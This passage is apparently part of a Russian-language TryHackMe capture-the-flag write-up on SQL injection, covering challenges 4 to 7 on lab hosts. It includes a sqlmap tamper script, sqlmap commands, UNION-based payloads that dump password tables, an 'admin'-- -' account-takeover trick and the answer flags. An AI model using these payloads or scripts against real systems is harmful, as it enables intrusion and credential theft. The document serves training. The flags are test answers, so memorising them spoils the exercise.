сеанс Flask в объект заголовка HTTP .       
```commandline
#!/usr/bin/python
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

address = "http://10.10.1.134:5000/challenge4"
password = "asd"

def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/signup", data=data)

def login(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/login", data=data)
        sessid = s.cookies.get("session", None)
    return "session={}".format(sessid)


def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)
    return payload
```



Папка, в которой находится скрипт tamper, также должна иметь пустой файл __init__.py   , чтобы sqlmap мог его загрузить. Перед запуском sqlmap со скриптом tamper измените переменную address и password внутри скрипта. После этого можно будет воспользоваться уязвимостью с помощью следующей команды:

```commandline
sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" 
--second-url http://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast

# --tamper so-tamper.py - The tamper script
# --url - The URL of the injection point, which is /signup in this case
# --data - The POST data from the registraion form to /signup. 
#   Password must be the same as the password in the tamper script
# --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
# -p username - The parameter to inject to
# --dbms sqlite - To speed things up
# --technique=U - The technique to use. [U]nion-based
# --no-cast - Turn off payload casting mechanism
```

Выгрузка таблицы пользователей может быть сложной без отключения механизма приведения полезной нагрузки с помощью 
параметра --no-cast . Пример разницы между приведением и отсутствием приведения можно увидеть здесь: 

```commandline
-- With casting enabled:
admin' union all select min(cast(x'717a717071' as text)||coalesce(cast(sql as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master 
where tbl_name=cast(x'7573657273' as text)-- daqo'
-- 7573657273 is 'users' in ascii

-- Without casting:
admin' union all select cast(x'717a6a7871' as text)||id||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null 
from users-- ypfr'
```

Когда sqlmap спросит, ответьте нет, чтобы следовать 302 перенаправлениям, затем ответьте да, чтобы продолжить 
дальнейшее тестирование, если он обнаружит некоторые WAF/ IPS . Ответьте нет, когда вас спросят, хотите ли вы 
объединить куки в будущих запросах, и скажите нет, чтобы уменьшить количество запросов. Как видно на изображении 
ниже, sqlmap смог найти уязвимость, что позволяет нам автоматизировать ее эксплуатацию.   



Затем флаг можно найти, выгрузив таблицу пользователей:

```commandline
sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" 
--second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
```
Sqlmap довольно шумный и добавит много пользователей, пытающихся эксплуатировать это приложение. Из-за этого вывод будет обрезан, и можно будет увидеть сообщение ниже.

[ ВНИМАНИЕ ]  вывод консоли будет обрезан до последних  256  строк из-за большого размера таблицы
Однако все данные сохраняются и записываются в файл дампа, как показано на рисунке ниже. Прочитайте верхнюю часть файла дампа, чтобы получить флаг:



Примечание: в рабочей системе флаг будет другим.

Задача
Воспользуйтесь уязвимой функцией и получите флаг.

### Ответить на вопросы ниже
```commandline
# task 7
http://10.10.255.151:5000/challenge4/login
profileID: '  union select 1,group_concat(password) from users'
password: asd
http://10.10.255.151:5000/challenge4/signup
'  union select 1,group_concat(password) from users'
asd
http://10.10.255.151:5000/challenge4/notes
THM{4644c7e157fd5498e7e4026c89650814}
```
Какой флаг у этого испытания?
```commandline
THM{4644c7e157fd5498e7e4026c89650814}
```

## Задание 8
### Цель
Для этого испытания уязвимость на странице заметок была исправлена. В приложение была добавлена новая функция 
смены пароля, поэтому пользователи теперь могут менять свой пароль, перейдя на страницу профиля. Новая функция 
уязвима для SQL-инъекции, поскольку оператор UPDATE объединяет имя пользователя непосредственно в SQL-запрос, как 
можно увидеть ниже. Цель здесь — эксплуатировать уязвимую функцию для получения доступа к учетной записи администратора.   

### Описание
Разработчик использовал заполнитель для параметра пароля, поскольку этот ввод поступает напрямую от пользователя. 
Имя пользователя не поступает напрямую от пользователя, а извлекается из базы данных на основе идентификатора 
пользователя, сохраненного в объекте сеанса. Поэтому разработчик посчитал, что имя пользователя безопасно для 
использования, и включил его напрямую в запрос вместо использования заполнителя:   

```commandline
UPDATE users SET password = ? WHERE username = '" + username + "'
```
Чтобы воспользоваться этой уязвимостью и получить доступ к учетной записи администратора, мы можем создать пользователя с именем admin'-- -.

После регистрации злонамеренного пользователя мы можем обновить пароль для нашего нового пользователя, чтобы вызвать 
уязвимость. При смене пароля приложение выполняет два запроса. Во-первых, оно запрашивает у базы данных имя 
пользователя и пароль для нашего текущего пользователя:  

`SELECT username, password FROM users WHERE id = ?`
Если все проверки пройдены успешно, он попытается обновить пароль для нашего пользователя. Поскольку имя 
пользователя напрямую добавляется в SQL- запрос, выполненный запрос будет выглядеть следующим образом: 

`UPDATE users SET password = ? WHERE username = 'admin' -- -'`
Это означает, что вместо обновления пароля для admin' -- -приложение обновило пароль для пользователя admin . После 
обновления пароля можно войти в систему как admin с новым паролем и просмотреть флаг. 

### Задача
Создайте нового пользователя и воспользуйтесь уязвимостью в функции обновления пароля, чтобы получить доступ к 
учетной записи администратора и получить флаг. 

### Ответить на вопросы ниже
```commandline
# task 8
http://10.10.255.151:5000/challenge5/login?next=http%3A%2F%2F10.10.255.151%3A5000%2Fchallenge5%2Fhome
http://10.10.255.151:5000/challenge5/signup
admin'-- -
asd
http://10.10.255.151:5000/challenge5/changepwd
asd
asd
asd
http://10.10.255.151:5000/challenge5/signup
admin
asd
THM{cd5c4f197d708fda06979f13d8081013}
```
Какой флаг у этого испытания?
```commandline
THM{cd5c4f197d708fda06979f13d8081013}
```

## Задание 9
### Цель
На страницу добавлена новая функция, и теперь можно искать книги в базе данных. Новая функция поиска уязвима для 
SQL- инъекции, поскольку она объединяет пользовательский ввод непосредственно в оператор SQL . Цель задачи — 
использовать эту уязвимость для поиска скрытого флага.  

### Описание
Когда пользователь впервые входит в игру, ему отображается сообщение: 

Тестируем новую функцию поиска книг, ознакомьтесь с ней здесь
Текст «здесь» представляет собой ссылку, ведущую пользователя на  http://MACHINE_IP:5000/challenge6/book?title=test ,
страницу, содержащую уязвимую функцию поиска, ее можно увидеть здесь: 



Веб-страница выполняет запрос GET с параметром titleпри поиске книги. Запрос, который она выполняет, можно увидеть здесь:

`SELECT  *  from  books  WHERE  id  =  ( SELECT  id  FROM  books  WHERE  title like  ' " + title + "% ' )`
Все, что нам нужно сделать, чтобы злоупотребить этим, — закрыть операнд LIKE справа от оператора LIKE. Например, мы 
можем сбросить все книги в базе данных, введя следующую команду: 

`' )  или  1 = 1 -- -`
### Задача
Используйте то, что вы узнали о SQL - инъекции на основе UNION, и воспользуйтесь уязвимой функцией поиска книг, 
чтобы получить флаг. 

### Ответить на вопросы ниже
```commandline
# task 9
http://10.10.255.151:5000/challenge6/login?next=http%3A%2F%2F10.10.255.151%3A5000%2Fchallenge6%2Fhome
http://10.10.255.151:5000/challenge6/signup
newuser
asd
http://10.10.255.151:5000/challenge6/login
newuser
asd
http://10.10.255.151:5000/challenge6/book?title=test
')UNION SELECT 1,2,3,group_concat(password) FROM users-- -
THM{27f8f7ce3c05ca8d6553bc5948a89210}
```
Какой флаг у этого испытания?
```commandline
THM{27f8f7ce3c05ca8d6553bc5948a89210}
```

## Задание 10
### Цель
В этом задании приложение выполняет запрос на ранней стадии процесса. Затем оно использует результат первого запроса 
во втором запросе позже без очистки. Оба запроса уязвимы, и первый запрос может быть использован с помощью слепой 
инъекции SQL . Однако, поскольку второй запрос также уязвим, можно упростить эксплуатацию и использовать инъекцию на 
основе UNION вместо слепой инъекции на основе булевых значений, что делает эксплуатацию более простой и менее шумной.
Цель задания — использовать эту уязвимость без использования слепой инъекции SQL и получить флаг.     

### Описание
Когда пользователь впервые входит в игру, ему отображается сообщение: 

Тестируем новую функцию поиска книг, ознакомьтесь с ней здесь
Текст «здесь» представляет собой ссылку, ведущую пользователя на  http://MACHINE_IP:5000/challenge7/book?title=test ,
страницу, содержащую уязвимую функцию поиска, ее можно увидеть здесь:  



При поиске названия книги веб-страница выполняет запрос GET. Затем приложение выполняет два запроса, где первый 
запрос получает идентификатор книги, затем позже в процессе выполняется новый SQL- запрос, чтобы получить всю информацию о книге. Два запроса можно увидеть здесь: 

```commandline
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```
Во-первых, мы ограничим результат нулевыми строками, что можно сделать, не давая ему никаких входных данных или 
входных данных, которые, как мы знаем, не существуют. Затем мы можем использовать предложение UNION для управления 
тем, что возвращает первый запрос, то есть данными, которые будут использоваться во втором запросе. Это означает, 
что мы можем ввести следующее значение в поле поиска:   
`' union select 'STRING`
После внедрения приведенного выше кода приложение выполнит следующие SQL- запросы:



Из запросов мы видим, что результатом первого запроса является STRING%, который используется в предложении WHERE 
второго запроса. 

Если мы заменим 'STRING на число, которое существует в базе данных, приложение должно вернуть допустимый объект. 
Однако приложение добавляет подстановочный знак (%) к строке, что означает, что мы должны сначала закомментировать 
подстановочный знак. Подстановочный знак можно закомментировать, добавив '-- - в конец строки, которую мы внедряем. 
Например, если мы внедряем следующую строку:    

`' union select '1'-- -`
Приложение должно отобразить пользователю книгу с идентификатором 1, как показано здесь:



Если бы мы сначала не ограничили результат нулевыми строками, мы бы не получили вывод оператора UNION, а получили бы 
содержимое из предложения LIKE. Например, внедрив следующую строку: 

`test' union select '1'-- -`
Приложение выполнило бы следующие запросы:.



Теперь, когда у нас есть полный контроль над вторым запросом, мы можем использовать SQL- инъекцию на основе UNION 
для извлечения данных из базы данных. Цель состоит в том, чтобы сделать второй запрос похожим на следующий запрос: 

`SELECT * FROM books WHERE id = '' union select 1,2,3,4-- -`
Заставить приложение выполнить указанный выше запрос должно быть так же просто, как ввести следующий запрос:

`' union select '1' union select 1,2,3,4-- -`
Однако мы закрываем строку, которая должна быть возвращена, добавляя одинарную кавычку (') перед вторым предложением 
UNION. Чтобы запрос сработал и вернул наше второе предложение UNION, нам придется экранировать одинарную кавычку. 
Экранирование одинарной кавычки можно сделать, удвоив кавычки (''). После удвоения кавычек у нас есть следующая строка:  

`' union select '-1''union select 1,2,3,4-- -`
Вставка строки выше вернет страницу, показанную здесь:

### Задача
Используйте то, что вы узнали о SQL - инъекции на основе UNION, и воспользуйтесь уязвимой функцией поиска книг, 
чтобы получить флаг. 
 
### Ответить на вопросы ниже
```commandline
# task 10
http://10.10.255.151:5000/challenge7/login?next=http%3A%2F%2F10.10.255.151%3A5000%2Fchallenge7%2Fhome
http://10.10.255.151:5000/challenge7/signup
newuser
asd
http://10.10.255.151:5000/challenge7/login
newuser
asd
http://10.10.255.151:5000/challenge7/book?title=test
' UNION SELECT '-1''UNION SELECT 1,2,3,group_concat(password) FROM users-- -
THM{183526c1843c09809695a9979a672f09}
```
Какой флаг у этого испытания?
```commandline
THM{183526c1843c09809695a9979a672f09}
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

-----------------------------------------------------------------------------------------------------------------------------


